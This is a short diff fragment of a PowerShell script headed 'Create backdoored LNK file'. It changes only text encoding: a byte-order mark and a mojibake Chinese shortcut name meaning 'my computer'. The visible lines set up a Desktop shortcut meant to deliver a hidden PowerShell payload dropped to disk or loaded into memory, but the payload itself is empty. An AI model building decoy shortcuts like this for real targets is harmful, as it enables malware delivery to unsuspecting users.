@@ -1,4 +1,4 @@
-#
+ï»¿#
 # Create backdoored LNK file - by Felix Weyne
 # Info: https://www.uperesia.com/booby-trapped-shortcut
 # -Usage: place your powershell payload in $payloadContents
@@ -6,7 +6,7 @@
 # -to be dropped to disk/loaded into memory
 #
 
-$shortcutName = "ÎÒµÄµçÄÔ.lnk"
+$shortcutName = "æˆ‘çš„ç”µè„‘.lnk"
 $shortcutOutputPath = "$Home\Desktop\"+$shortcutName
 $shortcutFallbackExecutionFolder="`$env:temp"
 $payloadContents =
